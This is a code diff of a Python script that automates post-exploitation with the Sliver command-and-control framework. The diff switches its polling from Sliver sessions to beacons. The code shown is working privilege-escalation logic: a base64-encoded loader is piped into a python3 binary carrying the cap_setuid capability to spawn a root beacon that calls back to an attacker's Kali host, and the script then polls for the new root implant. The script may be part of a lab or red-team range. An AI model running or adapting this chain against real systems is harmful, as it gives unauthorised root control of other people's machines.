@@ -129,8 +129,8 @@ def _parse_root_session_id(sliver_output: str, exclude: set[str]) -> str | None:
 
 
 def _capture_existing_session_ids() -> set[str]:
-    """Snapshot the set of currently-active session IDs."""
-    out = _list_sliver("sessions")
+    """Snapshot the set of currently-active beacon IDs."""
+    out = _list_sliver("beacons")
     ids: set[str] = set()
     saw_header = False
     for line in out.splitlines():
@@ -150,7 +150,7 @@ def _capture_existing_session_ids() -> set[str]:
 
 def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
                                 kali_host: str, scratch_dir: Path) -> str:
-    """Sub-phase A: invoke the capable python3 to spawn a root Sliver session.
+    """Sub-phase A: invoke the capable python3 to spawn a root Sliver beacon.
 
     Single-shot pipeline: ``echo <b64> | base64 -d | <cap_binary>``. The
     capable python3 honours the file's cap_setuid+ep on exec, so the
@@ -167,7 +167,7 @@ def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
     log(f"[+] Elevated loader: {len(elevated_b64)} base64 bytes")
 
     before = _capture_existing_session_ids()
-    log(f"[*] Existing session(s) before invocation: {sorted(before)}")
+    log(f"[*] Existing beacon(s) before invocation: {sorted(before)}")
 
     # sliver's `execute` parser eats ANY token starting with `-` after the
     # binary as if it were a sliver flag (silently!) -- so without `--` to
@@ -183,18 +183,18 @@ def subphase_capability_privesc(sliver_session_id: str, cap_binary: str,
     log(f"[*] sliver: {cmd[:90]}...")
     sliver_exec(sliver_session_id, cmd)
 
-    log(f"[*] Polling for the new root session (expected <{CAP_POLL_MAX_SECS}s)...")
+    log(f"[*] Polling for the new root beacon (expected <{CAP_POLL_MAX_SECS}s)...")
     deadline = time.time() + CAP_POLL_MAX_SECS
     while time.time() < deadline:
         time.sleep(CAP_POLL_INTERVAL_SECS)
-        out = _list_sliver("sessions")
+        out = _list_sliver("beacons")
         root_id = _parse_root_session_id(out, exclude=before)
         if root_id:
-            log(f"[+] New root session captured: {root_id}")
+            log(f"[+] New root beacon captured: {root_id}")
             return root_id
-        log("[*] still waiting for root session...")
+        log("[*] still waiting for root beacon...")
     raise RuntimeError(
-        "advanced_webserver_privesc: capable python3 produced no root session "
+        "advanced_webserver_privesc: capable python3 produced no root beacon "
         f"within {CAP_POLL_MAX_SECS} s; verify cap_setuid+ep on {cap_binary} "
         f"with `getcap {cap_binary}` from a manual sliver session"
     )
